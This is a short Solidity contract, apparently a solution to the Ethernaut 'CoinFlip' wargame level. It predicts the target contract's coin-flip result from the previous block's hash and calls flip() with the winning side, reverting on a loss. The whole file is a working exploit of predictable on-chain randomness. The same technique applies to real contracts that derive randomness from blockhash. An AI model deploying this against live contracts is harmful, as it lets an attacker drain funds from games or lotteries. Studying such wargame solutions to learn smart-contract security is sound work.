// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { ICoinFlip } from "../interfaces/ICoinFlip.sol";

contract CoinFlipWrecker {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  address immutable public owner;
  ICoinFlip immutable public cCoinFlip;


  constructor(address _coinFlip) {
    owner = msg.sender;
    cCoinFlip = ICoinFlip(_coinFlip);
  }

  modifier onlyOwner {
    require(msg.sender == owner, "ERR_NOT_OWNER");
    _;
  }

  function wreckIt() public onlyOwner {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    bool won = cCoinFlip.flip(side);

    require(won == true, "ERR_WIN_EXPECTED");
  }
}
